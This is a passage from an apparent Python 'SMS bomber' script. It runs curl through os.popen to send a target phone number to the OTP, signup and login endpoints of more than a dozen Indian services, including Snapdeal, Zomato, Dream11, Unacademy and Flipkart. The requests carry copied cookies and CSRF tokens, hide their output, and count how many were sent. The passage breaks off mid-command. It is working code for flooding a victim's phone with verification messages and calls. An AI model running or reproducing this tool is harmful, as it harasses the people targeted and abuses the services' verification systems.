                            curl -X POST -H "Host:m.snapdeal.com" -H "content-length:135" -H "xc:eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19" -H "h2:true" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "xg:eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "u:160081122259159083" -H "save-data:on" -H "us:" -H "accept:*/*" -H "origin:https://m.snapdeal.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://m.snapdeal.com/signin" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:Megatron=!tejKI25+72c19/igV+D1bvp2mwEhFLDS2jEPe1hWDR/NntchcNQEz7ufEKCEVUbEU7NEI5FXe9wOSZ4=" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_fbp=fb.1.1600811239704.1459306793" -H "cookie:cto_bundle=IHG_Xl90TENVUG1nU2xIZXZKWkE0OXlNbWZRTUpCRkJ5ZnplSnVJb2klMkZmTGZlaG0xbWd4cGhqUzluQmNZb1VWQldZWGVXeW4xTmdFSiUyRlc3VTVBOFpiU0twNzI0QXhFTkNNcUpGREM2VHdNYyUyRlF4WUpTNGVvU0djcCUyRnY3TU5ETG9hVVIyRXFNMnNNOGhzcERTZTJPb1hsQkNSdyUzRCUzRA" -H "cookie:_gcl_aw=GCL.1600811235.CjwKCAjwwab7BRBAEiwAapqpTHxX7o8bt5ZuM--2vVptInqF-rQ4ljlxR3_Yoor3rNa3CGvYPtaNwBoCb8cQAvD_BwE" -H "cookie:lt=utm_source%3Dearth_brand_new%7Cutm_content%3Dhomepage%7Cutm_medium%3Dbrand%2520term%2C%7Cutm_campaign%3DBrandCat%7Cref%3Dnull%7Cutm_term%3De%2Csnapdeal%7C" -H "cookie:splash=true" -H "cookie:alps=fix-dp" -H "cookie:xc=eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19" -H "cookie:xg=eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1" -H "cookie:sd.zone=Z6" -H "cookie:deviceos=android" -H "cookie:u=160081122259159083" -H "cookie:versm=v1" -H "cookie:JSESSIONID=98E8853981613F4AFE87740D9BFCAACF" -H "cookie:SCOUTER=z5qpdeh1b59qh2" -d 'j_password=null&j_mobilenumber='''
                + target +
                '''&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy' "https://m.snapdeal.com/signupCompleteAjax" > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#17",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:www.zomato.com" -H "content-length:80" -H "x-zomato-csrft:a6b0c09972b2bdd30c9c1b6552caee5d" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "accept:*/*" -H "origin:https://www.zomato.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.zomato.com/kanpur" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:__gads=ID=644864c877efb86f:T=1600810980:S=ALNI_MbFuORewzGHjkdv5wR9uXw2DaNI9g" -H "cookie:AWSALBTGCORS=7twkZZpj88hXfO6mAO4KyKBIuadfJH9D4KzWMnP1ypIl0B4NcUK+P26IFtaVeI805plfknXZVPuFn4KuLU4/SRej2JOMuRjoZ3s4DVl/CjHm5DqwQ91yQC32/3Hyk19InAA6Q9uar2kXMJ555r6WGebZE5Rf7devMzsU6HeX+XSC" -H "cookie:AWSALBTG=7twkZZpj88hXfO6mAO4KyKBIuadfJH9D4KzWMnP1ypIl0B4NcUK+P26IFtaVeI805plfknXZVPuFn4KuLU4/SRej2JOMuRjoZ3s4DVl/CjHm5DqwQ91yQC32/3Hyk19InAA6Q9uar2kXMJ555r6WGebZE5Rf7devMzsU6HeX+XSC" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:_uetvid=781ece33e16eed33a8f5652b0bfacda4" -H "cookie:_uetsid=a8cb8c64594c7cb5ec04b06f91b85702" -H "cookie:_fbp=fb.1.1600810976131.1717249975" -H "cookie:_gat_country=1" -H "cookie:_gat_city=1" -H "cookie:_gat_global=1" -H "cookie:_gcl_au=1.1.1326869440.1600810973" -H "cookie:_gid=GA1.2.2138122155.1600810973" -H "cookie:_ga=GA1.2.826955249.1600810973" -H "cookie:locus=%7B%22addressId%22%3A0%2C%22lat%22%3A26.4607%2C%22lng%22%3A80.3334%2C%22cityId%22%3A23%2C%22ltv%22%3A23%2C%22lty%22%3A%22city%22%2C%22fetchFromGoogle%22%3Afalse%2C%22dszId%22%3A15750%2C%22fen%22%3A%22Kanpur%22%7D" -H "cookie:lty=city" -H "cookie:ltv=23" -H "cookie:ak_bmsc=AD74F883AF02F8919020E72812FA4D3F312C8DEFBD0D0000DB6F6A5F86725137~plfvE6deCz7/0ERruwvEqqvTf4yeUNe/RNLI/h3koDn0op9gXkki8a5LxIv92TOJJUo3V3A7rGM3/698nd6N3AeB+1hYMSmqq44RZHCCrsHB+9D8lGNmaiNP/ffRcZI3Ietwv9KWy0Jnhu3wV9pwtKkZs7UT/aKuREMakpqaZhOpdGAPFhDwMix/9atoj+ywH53XpMY9Cb9IlKUy1O6vMN3EbOQXgaEu+lP4ZR08+xjCA=" -H "cookie:fbtrack=4f77e94d432d648e26273c38b002b7e3" -H "cookie:zl=en" -H "cookie:fbcity=23" -H "cookie:csrf=a6b0c09972b2bdd30c9c1b6552caee5d" -H "cookie:PHPSESSID=8071a1fa7b6f728acb522e9f022e13ae" -d '{"country_id":1,"phone":"'''
                + target +
                '''","verification_type":"sms","method":"phone"}' "https://www.zomato.com/webroutes/auth/login"  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#18",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:www.cuemath.com" -H "Connection:keep-alive" -H "Content-Length:235" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "Content-Type:application/JSON" -H "Accept:*/*" -H "Origin:https://www.cuemath.com" -H "Sec-Fetch-Site:same-origin" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.cuemath.com/the-ultimate-cuemath-olympiad/partner/timesofindia/register/?intent=ultimate-olympiad" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -H "Cookie:cue_country_code=IN; utm_source=GSBRAND_cuemath_olympiad_Ad3; utm_campaign=GSBRAND_cuemath_olympiad_Ad3; utm_medium=GSBRAND_cuemath_olympiad_Ad3; referrer=https%3A%2F%2Fwww.google.com%2F; landing_page=%2Fthe-ultimate-cuemath-olympiad%2Fpartner%2Ftimesofindia%2F%3Futm_source%3DGSBRAND_cuemath_olympiad_Ad3%26utm_medium%3DGSBRAND_cuemath_olympiad_Ad3%26utm_campaign%3DGSBRAND_cuemath_olympiad_Ad3; _gcl_au=1.1.802696303.1600810324; _ga=GA1.2.1146344855.1600810324; _gid=GA1.2.60529482.1600810324; cue_gacid=1146344855.1600810324; _dc_gtm_UA-75184559-1=1; itm_source=TIMESOFINDIA_CMO_2020; itm_campaign=CMO_2020; itm_landing_page=%2Fthe-ultimate-cuemath-olympiad%2Fpartner%2Ftimesofindia%2Fregister%2F%3Fintent%3Dultimate-olympiad; itm_date=Tue%2C%2022%20Sep%202020%2021%3A32%3A09%20GMT; itm_date_ts=1600810329; AF_BANNERS_SESSION_ID=1600810330240; _uetsid=d5ec55ecfc37dfb197547077352e97e8; _uetvid=15fa494b609eef1a17920bb8c97cd177; _CEFT=Q%3D%3D%3D; _fbp=fb.1.1600810333599.642589325; datadome=.J0PY0DZeA6ODk1RODKVV1J.v8SUpwW5w7ZwhQFLv4tALMu9qr9MO9IiQgk-ZcAS6kV2fKjcTQZvEpHFjwnID~7t1WwrVCXkKUMFZDE_-x; _cer.v=842d9f66d9ecd4e30bc1d54ddc3925dc526082e2.qh2x5y.0; _cer.s=c76b97ac66b7a5061c40c2562ce00ab39fe229df%7Chttps%3A%2F%2Frp-07aca5b582432bb3f.crazyegg.com%7Cqh2x5y" -d '{"intl_mobile":{"phone":""},"phone":"'''
                + target +
                '''","email":"nsbd@dn.djs","full_name":"hdhdhdg","place_id":"ChIJYYhT3gl3AjoRUDlkL1i5oIk","timezone":"Asia/Calcutta","detail_source":"CMO_2020","form_fields":"full_name,phone,email,place_id"}' "https://www.cuemath.com/api/v4/parents/"  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#19",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:www.dream11.com" -H "content-length:316" -H "accept:*/*" -H "device:pwa" -H "x-csrf:fb1f1947-4547-392d-9a28-a9de30d9e766" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "origin:https://www.dream11.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.dream11.com/register?ru=" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:WZRK_S_W4R-49K-494Z=%7B%22p%22%3A1%2C%22s%22%3A1600795342%2C%22t%22%3A1600795361%7D" -H "cookie:WZRK_G=dc2112f4850746a0b8b47c233471fe4a" -H "cookie:ajs_anonymous_id=%2218835b7c-2e60-48c2-a6c4-79dc7e7c169a%22" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:dh_user_id=25fdcb20-fcf8-11ea-b0df-81d0899f30b6" -H "cookie:__csrf=fb1f1947-4547-392d-9a28-a9de30d9e766" -d '{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}","variables":{"email":"tsunami@gmail.com","mobileNumber":"'''
                + target +
                '''","password":"tsunami@123astronomia"}}' "https://www.dream11.com/graphql/mutation/pwa/register"  > /dev/null 2>&1
                                    ''')
            times = times + 1
        except Exception as A:
            print("#20")
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:doubtnut.com" -H "content-length:16" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded" -H "accept:*/*" -H "origin:https://doubtnut.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://doubtnut.com/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:_ga=GA1.2.Y4Twn8bPt-E_czB_KcZojHFWtwN8UXp0QqtZRS2guBCZwJcdygTIRbxblqqhLv1I" -H "cookie:_ga_TW5C6PT68C=GS1.1.1600795082.1.1.1600795141.0" -H "cookie:_gid=GA1.2.809074082.1600795083" -H "cookie:a_1=5a223bcd-d40d-40c4-b83f-837e3dd460f2" -d 'phone='''
                + target +
                '''' "https://doubtnut.com/api/v1/user/login" --output Logfile > /dev/null 2>&1
                                    ''')
            times = times + 1
        except Exception as A:
            print("#21",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:user.vedantu.com" -H "content-length:74" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "accept:*/*" -H "origin:https://www.vedantu.com" -H "sec-fetch-site:same-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.vedantu.com/masterclass?utm_source=in&utm_medium=in_ggl_cpa&utm_campaign=ggl_Brand_Search&utm_term=ggl_Brand_Search_Exact_Brand_Vedantu&utm_content=in_Brand_Search_Exact_Brand_Vedantu_Ad2&gclsrc=aw.ds&&gclid=CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:_gcl_dc=GCL.1600794527.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE" -H "cookie:_gcl_aw=GCL.1600794527.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE" -H "cookie:moe_uuid=6a221a22-79b0-4a05-87a6-bb6ccc786f4e" -H "cookie:WZRK_S_8WR-895-K74Z=%7B%22p%22%3A1%2C%22s%22%3A1600794521%2C%22t%22%3A1600794520%7D" -H "cookie:km_lv=1600794517" -H "cookie:kvcd=1600794517298" -H "cookie:_gac_UA-52838179-3=1.1600792907.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE" -H "cookie:_gid=GA1.2.1580594851.1600792840" -H "cookie:_ga=GA1.2.999929697.1600792840" -H "cookie:USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%226a221a22-79b0-4a05-87a6-bb6ccc786f4e%22%2C%22deviceAdded%22%3Atrue%7D" -H "cookie:_fbp=fb.1.1600792808706.1882458684" -H "cookie:_gcl_au=1.1.1765065041.1600792806" -H "cookie:WZRK_G=9d0490f3acc94a80a8feafc7aaa146b0" -H "cookie:km_vs=1" -H "cookie:km_ai=qEioHmXYYtngAVbnv7c6PZcDSIM%3D" -d '{"email":null,"phoneCode":"+91","phoneNumber":"'''
                + target +
                '''","ver":"11.345"}' "https://user.vedantu.com/user/preLoginVerification" --output Logfile  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#22",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:unacademy.com" -H "content-length:107" -H "accept:*/*" -H "authorization:Bearer undefined" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "content-type:application/json" -H "origin:https://unacademy.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://unacademy.com/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:_gat_UA-69016858-2=1" -H "cookie:_anonymous_id=M-67682" -H "cookie:lux_uid=160079427639164156" -H "cookie:anonymous_session_id=3d4cc928-6a73-4f39-a10f-5c0d381ea8e7" -H "cookie:mp_535208d541f9b5935ef91a365b0439e1_mixpanel=%7B%22distinct_id%22%3A%20%22174b6b07ce059-08b01b7f2fd04-1d7a0a2f-42cc0-174b6b07ce2d6%22%2C%22%24device_id%22%3A%20%22174b6b07ce059-08b01b7f2fd04-1d7a0a2f-42cc0-174b6b07ce2d6%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22utm_source%22%3A%20%22google%22%2C%22utm_medium%22%3A%20%22cpc%22%2C%22utm_campaign%22%3A%20%221944493080%22%2C%22utm_content%22%3A%20%22%7Bcontent%7D%22%2C%22utm_term%22%3A%20%22unacademy%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22Platform%22%3A%20%22Desktop%22%7D" -H "cookie:loginRoute=%2F" -H "cookie:_gat=1" -H "cookie:_gac_UA-69016858-2=1.1600792925.CjwKCAjwwab7BRBAEiwAapqpTGaIHnaPxwpaImM5bpX0eqinIL12LBH8P9VAU4QLmRo2zsB0FFXUjhoCWToQAvD_BwE" -H "cookie:_gcl_aw=GCL.1600792920.CjwKCAjwwab7BRBAEiwAapqpTGaIHnaPxwpaImM5bpX0eqinIL12LBH8P9VAU4QLmRo2zsB0FFXUjhoCWToQAvD_BwE" -H "cookie:afUserId=d196d301-85b9-45ee-8a34-a66d1ed0a1aa-c" -H "cookie:_ttgclid=CjwKCAjwwab7BRBAEiwAapqpTGaIHnaPxwpaImM5bpX0eqinIL12LBH8P9VAU4QLmRo2zsB0FFXUjhoCWToQAvD_BwE" -H "cookie:_ttgclid=CjwKCAjwwab7BRBAEiwAapqpTGaIHnaPxwpaImM5bpX0eqinIL12LBH8P9VAU4QLmRo2zsB0FFXUjhoCWToQAvD_BwE" -H "cookie:_gid=GA1.2.2120759531.1600792879" -H "cookie:_ga=GA1.2.1664858815.1600792879" -H "cookie:_fbp=fb.1.1600792863709.1257609187" -H "cookie:source=google" -H "cookie:_gcl_au=1.1.762851911.1600792854" -d '{"phone":"'''
                + target +
                '''","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' "https://unacademy.com/api/v3/user/user_check/" --output Logfile  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#23",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:bcas-prod.byjusweb.com" -H "content-length:46" -H "accept:*/*" -H "origin:https://byjus.com" -H "user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/x-www-form-urlencoded" -H "referer:https://byjus.com/byjus-classes-book-a-free-demo-class/registration/?utm_source=google&utm_mode=CPA&utm_campaign=K12-Brand-Android-BYJU%27S-India-Apr10&utm_term=byjus&gclid=EAIaIQobChMIzKCzs5396wIVVqqWCh0TgQO4EAAYASAAEgK-V_D_BwE" -H "accept-encoding:gzip, deflate" -H "accept-language:en-US" -d 'phoneNumber='''
                + target +
                '''&page=free-trial-classes' "https://bcas-prod.byjusweb.com/api/send-otp" --output Logfile  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#24",A)
        try:
            os.popen('''
                            curl -X GET -H "Host:m.redbus.in" -H "accept:application/json, text/plain, */*" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://m.redbus.in/preregister" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9,hi;q=0.8" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:_gat_UA-9782412-15=1" -H "cookie:onetap=1" -H "cookie:_dc_gtm_UA-9782412-15=1" -H "cookie:tvc_user_type=new" -H "cookie:_gid=GA1.3.911062439.1600782905" -H "cookie:_ga=GA1.3.459788617.1600782905" -H "cookie:tvc_session_alive_bus=1" -H "cookie:tvc_smc_bus=google / organic / (not set)" -H "cookie:browserDetailLogged=true" -H "cookie:selectedCurrency=INR" -H "cookie:language=en" -H "cookie:currency=INR" -H "cookie:country=IND" -H "cookie:country_ISO=IN" -H "cookie:rbuuid=34f1a330-fcdb-11ea-84eb-b392e9686117" "https://m.redbus.in/api/getOtp?number='''
                     + target +
                     '''&cc=91&whatsAppOpted=undefined"  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#25",A)
        try:
            os.popen(
                'curl -X POST -H "Host:www.careers360.com" -H "Connection:keep-alive" -H "Content-Length:49" -H "Accept:*/*" -H "X-CSRFToken:9tKY96jb358WKiZBMwhz2EcranwljWDbxdqrQCnvqQWXNGbIvtfEQQLCbrzA8ssj" -H "X-Requested-With:XMLHttpRequest" -H "User-Agent:Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Origin:https://www.careers360.com" -H "Sec-Fetch-Site:same-origin" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.careers360.com/user/otp-verify/101e8d6e591af6688f640eee08f5a5f8?destination=&click_location=header&google_success=header" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -H "Cookie:_gcl_au=1.1.1168325424.1600579108; WZRK_G=4584ba1e8345400d92392a88464c9183; __asc=ce35392c174a9f2fbe2f2c29a0c; __auc=ce35392c174a9f2fbe2f2c29a0c; _ga=GA1.2.1646044729.1600579108; _gid=GA1.2.365026440.1600579108; _fbp=fb.1.1600579107930.1446075664; dataLayer_=Home Pages; csrftoken=RI5TGK7tuZdkJjVNzu3lRdSeRcztdtYqfsLmngbNRK1lMH7Uir1qFprpSgCI2ZNy; _omappvp=RIeaJ0pgkcvqwRygRT8VTxJ6PrpnRvze6xwTpZBXztsuBXhgRV5OIU97g9s0DivdxwVAHM0DF1teulefRfsK0wCo2MRjp325; G_ENABLED_IDPS=google; _dc_gtm_UA-46098128-1=1; _omappvs=1600579353765; WZRK_S_654-ZZ4-5Z5Z=%7B%22p%22%3A5%2C%22s%22%3A1600579103%2C%22t%22%3A1600579356%7D" -d "mobile_number='
                + target +
                '&method=call&uid=12692588" "https://www.careers360.com/ajax/no-cache/user/otp-send"  > /dev/null 2>&1'
            )
            times = times + 1
        except Exception as A:
            print("#26",A)
        try:
            os.popen(
                'curl -X GET -H "Host:api.coolwinks.com" -H "Connection:keep-alive" -H "Accept:*/*" -H "x-user-agent:Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36 CWUA/msite/0/" -H "User-Agent:Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "Origin:https://www.coolwinks.com" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.coolwinks.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" "https://api.coolwinks.com/api/accounts/is_already_registered/?username='
                + target + '"  > /dev/null 2>&1')
            times = times + 1
        except Exception as A:
            print("#27",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "Host:webapi.cansell.in" -H "Connection:keep-alive" -H "Content-Length:103" -H "Accept:application/json, text/plain, */*" -H "User-Agent:Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36" -H "Content-Type:application/json;charset=UTF-8" -H "Origin:https://m.cansell.in" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://m.cansell.in/register" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9,hi;q=0.8" -d '{"name":"Uwusjsj","surname":"wjeshs","email":"hsjs@gmail.com","phone":"'''
                + target +
                '''","password":"eeeeee"}' "https://webapi.cansell.in/api/User/SignUp"  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#28",A)
        try:
            os.popen(
                '''
                            curl -X POST -H "appVersion:8.9.0" -H "CONTENT_TYPE:application/json" -H "channel:gaana.com" -H "tgid:j9qcq0z2ur4llq2a58qqmag2" -H "sdkVersion:1.0" -H "appVersionCode:933" -H "deviceId:j9qcq0z2ur4llq2a58qqmag2" -H "platform:android" -H "sdkVersionCode:1" -H "Content-Type:application/json; charset=utf-8" -H "User-Agent:Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)" -H "Host:jsso1.indiatimes.com" -H "Connection:Keep-Alive" -H "Accept-Encoding:gzip" -H "Cookie:bm_sz=3185FA3CAAAF8BF3058604B10A671B95~YAAQ1Y0sMTkMfql0AQAAlUo4qwliHs15jkMexu1aNjEN8flD/z5LtSgQGynujCg13M4JSO4ngtKZ0upFyNBCQ7S0uzz118OjWhFVgf58p0Nm9h2GwqTJ6JQdKEEL+X3CzGTsv1rq/VFRAda6LCAWN456iJIhY0YTqPKFsRnVsKN4e5wY0RPTA7t0jCSPuyzFIEn3; _abck=815544E3DE0B9D20C0579C4BDD367BC8~-1~YAAQ1Y0sMToMfql0AQAAlUo4qwREAoH9ULlj0dvHMO+x8J1BtAjNeouGQsG9yzY5n8wdltMClCjNw81OTfwcAV/sFBz8BKBqtNcY8NqWE9Qxpu79nALy06xH2PUU0f2QUM3U8L1KYEuHRByl+07NOj5l8/ndZlP1k06L3GCL9ndWnryiFTQhrnhan0uBbzJIcgcgOf57TqwC5RJwlJCC8j+BeZq0FG1ISubR8UJoa1n3NCYSjCvvW0UDN/haWIAxDbNclqOFxx6dIeUhFx1IbypgQGsktxMWS1WMKGThxrQRJJV2FG8hDgDOXE3LpA==~-1~-1~-1" -H "Content-Length:27" -d '{"mobile":"+91-'''
                + target +
                '''"}' "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile"  > /dev/null 2>&1
                            ''')
            times = times + 1
        except Exception as A:
            print("#29",A)
        try:
            times = times + 1
            os.popen(
                '''
                            curl -X POST -H "Host:1.rome.api.flipkart.com" -H "Connection:keep-alive" -H "Content-Length:338" -H "x-user-agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile" -H "Origin:https://www.flipkart.com" -H "User-Agent:Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5" -H "content-type:application/json" -H "Accept:*/*" -H "Referer:https://www.flipkart.com/login?ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-US" -H "Cookie:T=BR%3Ackfcu8grn0xqvyyvwni4yxp6o.1600711394531; vh=632; vw=360; dpr=2; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; 